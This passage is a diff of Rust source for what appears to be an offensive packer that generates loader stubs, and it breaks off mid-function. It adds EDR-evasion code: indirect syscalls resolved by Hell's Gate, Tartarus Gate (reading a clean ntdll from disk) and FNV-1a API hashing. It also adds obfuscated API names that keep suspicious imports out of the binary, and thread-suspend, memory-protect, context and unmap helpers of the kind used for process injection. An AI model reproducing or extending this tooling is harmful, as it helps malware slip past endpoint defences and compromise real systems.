@@ -7,9 +7,11 @@
 //!
 //! - [`SyscallsMode::None`]: the technique fragments call the same `nt_*`
 //!   helpers, but the helpers map to the plain Win32 APIs.
-//! - [`SyscallsMode::Indirect`]: the helpers resolve SSNs at runtime with
-//!   Hell's Gate and invoke the kernel through the `syscall; ret` gadget in
-//!   ntdll's `.text`, so the suspicious Win32 imports never appear in the IAT.
+//! - [`SyscallsMode::Indirect`]: the helpers resolve SSNs at runtime (Hell's
+//!   Gate from the live ntdll, Tartarus Gate from a clean copy read from disk,
+//!   or API hashing matching each export by a precomputed FNV-1a hash) and
+//!   invoke the kernel through the `syscall; ret` gadget in ntdll's `.text`,
+//!   so the suspicious Win32 imports never appear in the IAT.
 //!
 //! The fragment contract is: technique fragments always call the `nt_*`
 //! helpers (never the Win32 APIs directly), and the helper implementation
@@ -40,7 +42,7 @@ pub struct YamlSyscallsConfig {
     #[serde(default = "default_mode")]
     pub mode: String,
 
-    /// SSN resolver (`hells_gate`; `tartarus_gate` arrives in phase 6b).
+    /// SSN resolver (`hells_gate` or `tartarus_gate`).
     #[serde(default = "default_resolver")]
     pub resolver: String,
 }
@@ -72,11 +74,19 @@ impl SyscallsMode {
     }
 }
 
-/// SSN resolution strategy (only Hell's Gate exists in phase 6a).
+/// SSN resolution strategy for `mode: indirect`.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Resolver {
-    /// Hell's Gate: read the SSN from the Nt* stub prologue in ntdll.
+    /// Hell's Gate: read the SSN from the Nt* stub prologue in the live ntdll.
+    /// Fails with a clear error when an EDR has hooked the export stub.
     HellsGate,
+    /// Tartarus Gate: read the SSN from a clean copy of ntdll read from disk,
+    /// so hooks in the live ntdll's export stubs do not hide the SSN.
+    TartarusGate,
+    /// API hashing: resolve each SSN by a precomputed FNV-1a hash of its name,
+    /// walking a clean copy of ntdll read from disk, so neither `GetProcAddress`
+    /// nor any function-name string is needed.
+    ApiHash,
 }
 
 impl Resolver {
@@ -84,6 +94,8 @@ impl Resolver {
     pub fn label(self) -> &'static str {
         match self {
             Resolver::HellsGate => "hells_gate",
+            Resolver::TartarusGate => "tartarus_gate",
+            Resolver::ApiHash => "api_hash",
         }
     }
 }
@@ -128,10 +140,12 @@ impl SyscallsConfig {
 
         let resolver = match yaml.resolver.as_str() {
             "hells_gate" => Resolver::HellsGate,
+            "tartarus_gate" => Resolver::TartarusGate,
+            "api_hash" => Resolver::ApiHash,
             other => {
                 return Err(PackerError::Validation(format!(
-                    "invalid build.stub.syscalls.resolver '{other}': expected 'hells_gate' \
-                     (tartarus_gate arrives in phase 6b)"
+                    "invalid build.stub.syscalls.resolver '{other}': expected 'hells_gate', \
+                     'tartarus_gate' or 'api_hash'"
                 )));
             }
         };
@@ -381,21 +395,10 @@ const UNMAP_VIEW_NONE: &str = r#"    /// Signature of the ntdll export resolved 
     /// NtUnmapViewOfSection(ProcessHandle, BaseAddress). None mode: resolve
     /// the export dynamically (windows-rs does not declare it) and call it.
     pub fn nt_unmap_view(process: HANDLE, base: *mut core::ffi::c_void) -> i32 {
-        let Ok(ntdll) = std::ffi::CString::new($NTDLL_DEF$) else {
+        let address = resolve_nt_export(&$UNMAP_FUNC_DEF$);
+        if address == 0 {
             return STATUS_UNSUCCESSFUL;
-        };
-        let Ok(unmap) = std::ffi::CString::new($UNMAP_FUNC_DEF$) else {
-            return STATUS_UNSUCCESSFUL;
-        };
-        let module = match unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) } {
-            Ok(module) => module,
-            Err(_) => return STATUS_UNSUCCESSFUL,
-        };
-        let Some(address) =
-            (unsafe { GetProcAddress(module, PCSTR(unmap.as_ptr() as *const u8)) })
-        else {
-            return STATUS_UNSUCCESSFUL;
-        };
+        }
         let unmap: UnmapViewFn = unsafe { std::mem::transmute(address) };
         unsafe { unmap(process, base) }
     }
@@ -419,6 +422,214 @@ const UNMAP_VIEW_INDIRECT: &str = r#"    /// NtUnmapViewOfSection(ProcessHandle,
                 0,
                 0,
                 ssns.unmap_view,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_protect_vm`, mode none: VirtualProtectEx mapped to an NTSTATUS.
+const PROTECT_VM_NONE: &str = r#"    /// NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize,
+    /// NewProtect, &OldProtect). None mode: VirtualProtectEx mapped to an
+    /// NTSTATUS. The address and size are passed by value (the caller does
+    /// not need the in-out results).
+    pub fn nt_protect_vm(
+        process: HANDLE,
+        base: *mut core::ffi::c_void,
+        size: usize,
+        new_protect: u32,
+        old_protect: *mut u32,
+    ) -> i32 {
+        unsafe {
+            match VirtualProtectEx(
+                process,
+                base,
+                size,
+                PAGE_PROTECTION_FLAGS(new_protect),
+                old_protect as *mut PAGE_PROTECTION_FLAGS,
+            ) {
+                Ok(()) => STATUS_SUCCESS,
+                Err(_) => STATUS_UNSUCCESSFUL,
+            }
+        }
+    }
+"#;
+
+/// `nt_protect_vm`, mode indirect: syscall with the resolved SSN.
+const PROTECT_VM_INDIRECT: &str = r#"    /// NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize,
+    /// NewProtect, &OldProtect). BaseAddress/RegionSize are in-out pointers;
+    /// the helpers expose them by value so the caller can ignore the results.
+    pub fn nt_protect_vm(
+        process: HANDLE,
+        base: *mut core::ffi::c_void,
+        size: usize,
+        new_protect: u32,
+        old_protect: *mut u32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let mut base_addr = base;
+        let mut region = size;
+        unsafe {
+            nt_invoke(
+                process.0 as usize,
+                &mut base_addr as *mut _ as usize,
+                &mut region as *mut _ as usize,
+                new_protect as usize,
+                old_protect as usize,
+                0,
+                ssns.protect_vm,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_suspend_thread`, mode none: SuspendThread mapped to an NTSTATUS.
+const SUSPEND_THREAD_NONE: &str = r#"    /// NtSuspendThread(ThreadHandle, &PreviousSuspendCount). None mode:
+    /// SuspendThread mapped to an NTSTATUS.
+    pub fn nt_suspend_thread(thread: HANDLE, previous: *mut u32) -> i32 {
+        unsafe {
+            let count = SuspendThread(thread);
+            if count == u32::MAX {
+                return STATUS_UNSUCCESSFUL;
+            }
+            if !previous.is_null() {
+                *previous = count;
+            }
+            STATUS_SUCCESS
+        }
+    }
+"#;
+
+/// `nt_suspend_thread`, mode indirect.
+const SUSPEND_THREAD_INDIRECT: &str = r#"    /// NtSuspendThread(ThreadHandle, &PreviousSuspendCount).
+    pub fn nt_suspend_thread(thread: HANDLE, previous: *mut u32) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread.0 as usize,
+                previous as usize,
+                0,
+                0,
+                0,
+                0,
+                ssns.suspend_thread,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_query_info_process`, mode none: windows-rs does not declare
+/// `NtQueryInformationProcess`, so it is resolved dynamically (like
+/// `nt_unmap_view`). `$QUERY_FUNC_DEF$` is substituted by the renderer with a
+/// runtime-reconstructed (obfuscated) string.
+const QUERY_INFO_PROCESS_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type QueryInfoFn = unsafe extern "system" fn(
+        HANDLE,
+        i32,
+        *mut core::ffi::c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
+
+    /// NtQueryInformationProcess(ProcessHandle, ProcessInformationClass,
+    /// ProcessInformation, ProcessInformationLength, ReturnLength). None mode:
+    /// resolve the export dynamically (windows-rs does not declare it).
+    pub fn nt_query_info_process(
+        process: HANDLE,
+        info_class: i32,
+        info: *mut core::ffi::c_void,
+        info_len: u32,
+        return_len: *mut u32,
+    ) -> i32 {
+        let address = resolve_nt_export(&$QUERY_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let query: QueryInfoFn = unsafe { std::mem::transmute(address) };
+        unsafe { query(process, info_class, info, info_len, return_len) }
+    }
+"#;
+
+/// `nt_query_info_process`, mode indirect.
+const QUERY_INFO_PROCESS_INDIRECT: &str = r#"    /// NtQueryInformationProcess(ProcessHandle, ProcessInformationClass,
+    /// ProcessInformation, ProcessInformationLength, ReturnLength).
+    pub fn nt_query_info_process(
+        process: HANDLE,
+        info_class: i32,
+        info: *mut core::ffi::c_void,
+        info_len: u32,
+        return_len: *mut u32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                process.0 as usize,
+                info_class as usize,
+                info as usize,
+                info_len as usize,
+                return_len as usize,
+                0,
+                ssns.query_info_process,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_get_context_thread`, mode none: windows-rs does not declare
+/// `NtGetContextThread`, so it is resolved dynamically. `$GET_CONTEXT_FUNC_DEF$`
+/// is substituted by the renderer with a runtime-reconstructed (obfuscated)
+/// string.
+const GET_CONTEXT_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type GetContextFn = unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void) -> i32;
+
+    /// NtGetContextThread(ThreadHandle, &Context). None mode: resolve the
+    /// export dynamically (windows-rs does not declare it).
+    pub fn nt_get_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
+        let address = resolve_nt_export(&$GET_CONTEXT_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let get_context: GetContextFn = unsafe { std::mem::transmute(address) };
+        unsafe { get_context(thread, context) }
+    }
+"#;
+
+/// `nt_get_context_thread`, mode indirect.
+const GET_CONTEXT_THREAD_INDIRECT: &str = r#"    /// NtGetContextThread(ThreadHandle, &Context).
+    pub fn nt_get_context_thread(thread: HANDLE, context: *mut core::ffi::c_void) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread.0 as usize,
+                context as usize,
+                0,
+                0,
+                0,
+                0,
+                ssns.get_context_thread,
                 *gadget,
             )
         }
@@ -462,6 +673,34 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         helper_none: UNMAP_VIEW_NONE,
         helper_indirect: UNMAP_VIEW_INDIRECT,
     },
+    NtFunction {
+        name: "NtProtectVirtualMemory",
+        table_field: "protect_vm",
+        helper_name: "nt_protect_vm",
+        helper_none: PROTECT_VM_NONE,
+        helper_indirect: PROTECT_VM_INDIRECT,
+    },
+    NtFunction {
+        name: "NtSuspendThread",
+        table_field: "suspend_thread",
+        helper_name: "nt_suspend_thread",
+        helper_none: SUSPEND_THREAD_NONE,
+        helper_indirect: SUSPEND_THREAD_INDIRECT,
+    },
+    NtFunction {
+        name: "NtQueryInformationProcess",
+        table_field: "query_info_process",
+        helper_name: "nt_query_info_process",
+        helper_none: QUERY_INFO_PROCESS_NONE,
+        helper_indirect: QUERY_INFO_PROCESS_INDIRECT,
+    },
+    NtFunction {
+        name: "NtGetContextThread",
+        table_field: "get_context_thread",
+        helper_name: "nt_get_context_thread",
+        helper_none: GET_CONTEXT_THREAD_NONE,
+        helper_indirect: GET_CONTEXT_THREAD_INDIRECT,
+    },
 ];
 
 /// The Nt* function names the active techniques need, deduplicated and in the
@@ -491,12 +730,30 @@ fn required_functions(pipeline: &[RuntimeStep]) -> Vec<&'static NtFunction> {
         .collect()
 }
 
+/// FNV-1a 64-bit hash of a function name.
+///
+/// The API-hashing resolver embeds these hashes as numeric constants instead of
+/// the (obfuscated) Nt* names, so it needs neither `GetProcAddress` nor a name
+/// string. Mirrors the `api_hash` function emitted into the generated stub —
+/// keep the two in sync.
+fn api_hash(name: &[u8]) -> u64 {
+    const OFFSET_BASIS: u64 = 0xcbf2_9ce4_8422_2325;
+    const PRIME: u64 = 0x0000_0100_0000_01b3;
+    let mut hash = OFFSET_BASIS;
+    for &byte in name {
+        hash ^= byte as u64;
+        hash = hash.wrapping_mul(PRIME);
+    }
+    hash
+}
+
 /// Renders the `$SYSCALLS_BLOCK$` fragment for the given pipeline.
 ///
 /// - No active technique needs syscalls: a no-op `init_syscalls`.
 /// - `mode: none`: the `nt_*` helpers mapped to the direct Win32 APIs.
-/// - `mode: indirect`: the full Hell's Gate layer (SSN table, resolver, ASM
-///   trampoline, gadget scanner) plus the helpers.
+/// - `mode: indirect`: the full syscall layer (SSN table, resolver — Hell's
+///   Gate, Tartarus Gate or API hashing —, ASM trampoline, gadget scanner) plus
+///   the helpers.
 pub fn render_block(
     config: &SyscallsConfig,
     pipeline: &[RuntimeStep],
@@ -516,22 +773,28 @@ pub fn render_block(
             "// --- Syscall layer (build.stub.syscalls.mode = none) ---\n// Direct Win32 calls: the \
              fragments always call the nt_* helpers, which map to\n// the Win32 APIs below. The \
              DLL/function names are rebuilt at runtime from\n// obfuscated bytes injected by the \
-             packer.",
+             packer."
+                .to_string(),
             render_none(&required, strings),
         ),
-        SyscallsMode::Indirect => (
-            "// --- Syscall layer (build.stub.syscalls.mode = indirect, resolver = hells_gate) ---\n// \
-             Indirect syscalls with Hell's Gate SSN resolution. The Nt* names are\n// rebuilt \
-             at runtime from obfuscated bytes injected by the packer, so none\n// of them appears \
-             in the binary. See docs/techniques/indirect_syscalls.md.",
-            render_indirect(&required, strings),
-        ),
+        SyscallsMode::Indirect => {
+            let resolver = config.resolver.label();
+            (
+                format!(
+                    "// --- Syscall layer (build.stub.syscalls.mode = indirect, resolver = {resolver}) ---\n// \
+                     Indirect syscalls with {resolver} SSN resolution. The Nt* names never\n// appear in \
+                     the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
+                     api_hash replaces them with precomputed FNV-1a hashes.\n// See docs/techniques/indirect_syscalls.md."
+                ),
+                render_indirect(config, &required, strings),
+            )
+        }
     };
 
     let reexports: Vec<&str> = std::iter::once("init_syscalls")
         .chain(required.iter().map(|f| f.helper_name))
         .collect();
-    assemble(header, &body, &reexports)
+    assemble(&header, &body, &reexports)
 }
 
 /// Wraps the rendered body in `mod syscalls { ... }` and re-exports the
@@ -555,9 +818,9 @@ const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
     use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
     use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
     use windows::Win32::System::Memory::{
-        VirtualAllocEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
+        VirtualAllocEx, VirtualProtectEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
     };
-    use windows::Win32::System::Threading::ResumeThread;
+    use windows::Win32::System::Threading::{ResumeThread, SuspendThread};
 
     const STATUS_SUCCESS: i32 = 0;
     /// Generic failure for a mapped Win32 call that has no real NTSTATUS.
@@ -567,11 +830,33 @@ const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
     pub fn init_syscalls() -> Result<(), String> {
         Ok(())
     }
+
+    /// Resolves an ntdll export by name and returns its address (0 on failure).
+    /// Used by the none-mode helpers for the Nt* functions windows-rs does not
+    /// declare. The DLL/function names are reconstructed at runtime from the
+    /// obfuscated bytes the packer injects.
+    fn resolve_nt_export(name: &str) -> usize {
+        let Ok(ntdll) = std::ffi::CString::new($NTDLL_DEF$) else {
+            return 0;
+        };
+        let Ok(fn_name) = std::ffi::CString::new(name) else {
+            return 0;
+        };
+        let Ok(module) = (unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }) else {
+            return 0;
+        };
+        let Some(address) =
+            (unsafe { GetProcAddress(module, PCSTR(fn_name.as_ptr() as *const u8)) })
+        else {
+            return 0;
+        };
+        address as usize
+    }
 "#;
 
-/// Prelude of the `mode: indirect` block: trampoline, SSN table, resolver and
-/// gadget scanner. `$SSN_FIELDS$` / `$SSN_INIT$` / `$SSN_RESOLVE$` /
-/// `$NTDLL_DEF$` are filled by [`render_indirect`].
+/// Prelude of the `mode: indirect` block: trampoline, SSN table, gadget
+/// scanner and the resolver body placeholder. `$SSN_FIELDS$` / `$SSN_INIT$` /
+/// `$RESOLVER_BODY$` are filled by [`render_indirect`].
 const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
     use std::sync::OnceLock;
 
@@ -625,8 +910,8 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
         "jmp r11",
     );
 
-    /// SSNs resolved at startup by Hell's Gate. The packer emits exactly the
-    /// fields the active techniques need.
+    /// SSNs resolved at startup. The packer emits exactly the fields the
+    /// active techniques need.
     struct SsnTable {
 $SSN_FIELDS$
     }
@@ -642,7 +927,7 @@ $SSN_FIELDS$
         NtdllNotFound,
         #[error("could not resolve '{0}'")]
         FunctionNotFound(String),
-        #[error("ntdll appears hooked on '{0}': Hell's Gate cannot read its SSN (phase 6b, Tartarus Gate, will handle this)")]
+        #[error("the SSN could not be read from '{0}': the ntdll stub prologue is hooked (switch resolver to tartarus_gate)")]
         PatternMismatch(String),
         #[error("could not locate a syscall; ret gadget in ntdll")]
         GadgetNotFound,
@@ -659,37 +944,6 @@ $SSN_FIELDS$
         let _ = SSNS.set(table);
         let _ = GADGET.set(gadget);
         Ok(())
-    }
-
-    /// Hell's Gate: reads each SSN out of the Nt* stub prologue in ntdll.
-    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
-        let ntdll =
-            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
-        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
-            .map_err(|_| SyscallError::NtdllNotFound)?;
-
-        let mut table = SsnTable {
-$SSN_INIT$
-        };
-$SSN_RESOLVE$
-
-        let gadget = find_gadget(module)?;
-        Ok((table, gadget))
-    }
-
-    /// Resolves one function and reads its SSN from the stub prologue.
-    fn resolve_ssn(module: HMODULE, name: &str) -> Result<u32, SyscallError> {
-        let cname = std::ffi::CString::new(name)
-            .map_err(|_| SyscallError::FunctionNotFound(name.to_string()))?;
-        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
-        let Some(address) = address else {
-            return Err(SyscallError::FunctionNotFound(name.to_string()));
-        };
-        let prologue = unsafe { std::slice::from_raw_parts(address as *const u8, 8) };
-        match parse_ssn(prologue) {
-            Some(ssn) => Ok(ssn),
-            None => Err(SyscallError::PatternMismatch(name.to_string())),
-        }
     }
 
     /// Returns the SSN when `bytes` starts with the canonical prologue
@@ -760,6 +1014,275 @@ $SSN_RESOLVE$
         let s = unsafe { std::slice::from_raw_parts(p as *const u8, 4) };
         Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
     }
+
+$RESOLVER_BODY$
+"#;
+
+/// Hell's Gate resolver: reads SSNs out of the live ntdll export stubs.
+/// `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` are filled by
+/// [`render_indirect`].
+const HELLS_GATE_RESOLVER: &str = r#"    /// Hell's Gate: reads each SSN out of the Nt* stub prologue in ntdll.
+    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
+        let ntdll =
+            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
+        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
+            .map_err(|_| SyscallError::NtdllNotFound)?;
+
+        let mut table = SsnTable {
+$SSN_INIT$
+        };
+$SSN_RESOLVE$
+
+        let gadget = find_gadget(module)?;
+        Ok((table, gadget))
+    }
+
+    /// Resolves one function and reads its SSN from the stub prologue.
+    fn resolve_ssn(module: HMODULE, name: &str) -> Result<u32, SyscallError> {
+        let cname = std::ffi::CString::new(name)
+            .map_err(|_| SyscallError::FunctionNotFound(name.to_string()))?;
+        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
+        let Some(address) = address else {
+            return Err(SyscallError::FunctionNotFound(name.to_string()));
+        };
+        let prologue = unsafe { std::slice::from_raw_parts(address as *const u8, 8) };
+        match parse_ssn(prologue) {
+            Some(ssn) => Ok(ssn),
+            None => Err(SyscallError::PatternMismatch(name.to_string())),
+        }
+    }
+"#;
+
+/// PE-file walk helpers shared by the disk-reading resolvers (Tartarus Gate and
+/// API hashing): RVA→file-offset conversion and bounds-checked u16/u32 reads.
+/// Injected into the resolver body through `$FILE_PE_HELPERS$`.
+const FILE_PE_HELPERS: &str = r#"    /// Converts a PE RVA to a file offset using the section table.
+    fn rva_to_offset(file: &[u8], rva: usize) -> Option<usize> {
+        let e_lfanew = pe32_at(file, 0x3C)? as usize;
+        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
+            return None;
+        }
+        let num_sections = pe16_at(file, e_lfanew + 4 + 2)? as usize;
+        let opt_size = pe16_at(file, e_lfanew + 4 + 16)? as usize;
+        let table = e_lfanew + 4 + 20 + opt_size as usize;
+
+        let mut first_va: Option<usize> = None;
+        for i in 0..num_sections {
+            let s = table + i * 40;
+            let va = pe32_at(file, s + 12)? as usize;
+            let raw_size = pe32_at(file, s + 16)? as usize;
+            let raw = pe32_at(file, s + 20)? as usize;
+            first_va = Some(first_va.map_or(va, |f| f.min(va)));
+            if rva >= va && rva - va < raw_size {
+                return Some(raw + (rva - va));
+            }
+        }
+        // RVAs below the first section live in the headers, which map 1:1.
+        match first_va {
+            Some(first) if rva < first => Some(rva),
+            _ => None,
+        }
+    }
+
+    /// Bounds-checked little-endian u16 read from the clean file image.
+    fn pe16_at(file: &[u8], off: usize) -> Option<u16> {
+        let s = file.get(off..off.checked_add(2)?)?;
+        Some(u16::from_le_bytes([s[0], s[1]]))
+    }
+
+    /// Bounds-checked little-endian u32 read from the clean file image.
+    fn pe32_at(file: &[u8], off: usize) -> Option<u32> {
+        let s = file.get(off..off.checked_add(4)?)?;
+        Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
+    }
+"#;
+
+/// Tartarus Gate resolver: reads SSNs from a clean copy of ntdll read from
+/// disk. `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` / `$NTDLL_PATH_DEF$` /
+/// `$FILE_PE_HELPERS$` are filled by [`render_indirect`].
+const TARTARUS_GATE_RESOLVER: &str = r#"    /// Tartarus Gate: reads each SSN from a clean copy of ntdll read from
+    /// disk, so EDR hooks in the live export stubs cannot hide the SSN. The
+    /// gadget still comes from the live ntdll (its `.text` is not hooked).
+    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
+        let path = $NTDLL_PATH_DEF$;
+        let file = std::fs::read(path).map_err(|_| SyscallError::NtdllNotFound)?;
+
+        let mut table = SsnTable {
+$SSN_INIT$
+        };
+$SSN_RESOLVE$
+
+        let ntdll =
+            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
+        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
+            .map_err(|_| SyscallError::NtdllNotFound)?;
+        let gadget = find_gadget(module)?;
+        Ok((table, gadget))
+    }
+
+    /// Resolves one function and reads its SSN from the clean file image.
+    fn resolve_ssn(file: &[u8], name: &str) -> Result<u32, SyscallError> {
+        let rva = export_rva(file, name)
+            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
+        let offset = rva_to_offset(file, rva as usize)
+            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
+        let Some(end) = offset.checked_add(8) else {
+            return Err(SyscallError::FunctionNotFound(name.to_string()));
+        };
+        let prologue = file
+            .get(offset..end)
+            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
+        match parse_ssn(prologue) {
+            Some(ssn) => Ok(ssn),
+            None => Err(SyscallError::PatternMismatch(name.to_string())),
+        }
+    }
+
+    /// Finds a function's RVA in a PE image's export directory. `file` is the
+    /// raw bytes of the (clean) ntdll file. Safe slice reads throughout.
+    fn export_rva(file: &[u8], name: &str) -> Option<u32> {
+        let e_lfanew = pe32_at(file, 0x3C)? as usize;
+        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
+            return None;
+        }
+        let opt = e_lfanew + 4 + 20;
+        let magic = pe16_at(file, opt)?;
+        // The data directory starts at optional-header offset 112 (PE32+) or
+        // 96 (PE32); ntdll on x64 is PE32+.
+        let dir_off = if magic == 0x20b { opt + 112 } else { opt + 96 };
+        let export_va = pe32_at(file, dir_off)? as usize;
+        if export_va == 0 {
+            return None;
+        }
+        let ed = rva_to_offset(file, export_va)?;
+        let num_names = pe32_at(file, ed + 24)? as usize;
+        let addr_functions = pe32_at(file, ed + 28)? as usize;
+        let addr_names = pe32_at(file, ed + 32)? as usize;
+        let addr_ordinals = pe32_at(file, ed + 36)? as usize;
+
+        for i in 0..num_names {
+            let name_rva =
+                pe32_at(file, rva_to_offset(file, addr_names.checked_add(i.checked_mul(4)?)?)?)?
+                    as usize;
+            let name_off = rva_to_offset(file, name_rva)?;
+            let rest = file.get(name_off..)?;
+            let end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
+            if &rest[..end] == name.as_bytes() {
+                let ordinal = pe16_at(
+                    file,
+                    rva_to_offset(file, addr_ordinals.checked_add(i.checked_mul(2)?)?)?,
+                )? as usize;
+                return pe32_at(
+                    file,
+                    rva_to_offset(file, addr_functions.checked_add(ordinal.checked_mul(4)?)?)?,
+                );
+            }
+        }
+        None
+    }
+
+$FILE_PE_HELPERS$
+"#;
+
+/// API-hashing resolver: walks a clean copy of ntdll read from disk and matches
+/// each required function by a precomputed FNV-1a hash of its name, so neither
+/// `GetProcAddress` nor any function-name string is needed. The SSN is read
+/// from the clean prologue; the gadget still comes from the live ntdll.
+/// `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` / `$NTDLL_PATH_DEF$` /
+/// `$FILE_PE_HELPERS$` are filled by [`render_indirect`].
+const API_HASH_RESOLVER: &str = r#"    /// API hashing: resolves each SSN by a precomputed FNV-1a hash of its
+    /// name, walking a clean copy of ntdll read from disk. No GetProcAddress
+    /// and no function-name strings are involved.
+    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
+        let path = $NTDLL_PATH_DEF$;
+        let file = std::fs::read(path).map_err(|_| SyscallError::NtdllNotFound)?;
+
+        let mut table = SsnTable {
+$SSN_INIT$
+        };
+$SSN_RESOLVE$
+
+        let ntdll =
+            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
+        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
+            .map_err(|_| SyscallError::NtdllNotFound)?;
+        let gadget = find_gadget(module)?;
+        Ok((table, gadget))
+    }
+
+    /// FNV-1a 64-bit hash of a function name. Mirrors the packer's `api_hash`
+    /// (`engine::syscalls`); keep the two in sync.
+    fn api_hash(name: &[u8]) -> u64 {
+        let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
+        for &byte in name {
+            hash ^= byte as u64;
+            hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
+        }
+        hash
+    }
+
+    /// Resolves one function by hash and reads its SSN from the clean file.
+    fn resolve_ssn(file: &[u8], hash: u64) -> Result<u32, SyscallError> {
+        let rva = export_rva_by_hash(file, hash)
+            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
+        let offset = rva_to_offset(file, rva as usize)
+            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
+        let Some(end) = offset.checked_add(8) else {
+            return Err(SyscallError::FunctionNotFound(format!("0x{hash:016x}")));
+        };
+        let prologue = file
+            .get(offset..end)
+            .ok_or_else(|| SyscallError::FunctionNotFound(format!("0x{hash:016x}")))?;
+        match parse_ssn(prologue) {
+            Some(ssn) => Ok(ssn),
+            None => Err(SyscallError::PatternMismatch(format!("0x{hash:016x}"))),
+        }
+    }
+
+    /// Finds a function's RVA by matching its hashed export name against
+    /// `hash`. `file` is the raw bytes of the (clean) ntdll file.
+    fn export_rva_by_hash(file: &[u8], hash: u64) -> Option<u32> {
+        let e_lfanew = pe32_at(file, 0x3C)? as usize;
+        if pe32_at(file, e_lfanew)? != 0x0000_4550 {
+            return None;
+        }
+        let opt = e_lfanew + 4 + 20;
+        let magic = pe16_at(file, opt)?;
+        // The data directory starts at optional-header offset 112 (PE32+) or
+        // 96 (PE32); ntdll on x64 is PE32+.
+        let dir_off = if magic == 0x20b { opt + 112 } else { opt + 96 };
+        let export_va = pe32_at(file, dir_off)? as usize;
+        if export_va == 0 {
+            return None;
+        }
+        let ed = rva_to_offset(file, export_va)?;
+        let num_names = pe32_at(file, ed + 24)? as usize;
+        let addr_functions = pe32_at(file, ed + 28)? as usize;
+        let addr_names = pe32_at(file, ed + 32)? as usize;
+        let addr_ordinals = pe32_at(file, ed + 36)? as usize;
+
+        for i in 0..num_names {
+            let name_rva =
+                pe32_at(file, rva_to_offset(file, addr_names.checked_add(i.checked_mul(4)?)?)?)?
+                    as usize;
+            let name_off = rva_to_offset(file, name_rva)?;
+            let rest = file.get(name_off..)?;
+            let end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
+            if api_hash(&rest[..end]) == hash {
+                let ordinal = pe16_at(
+                    file,
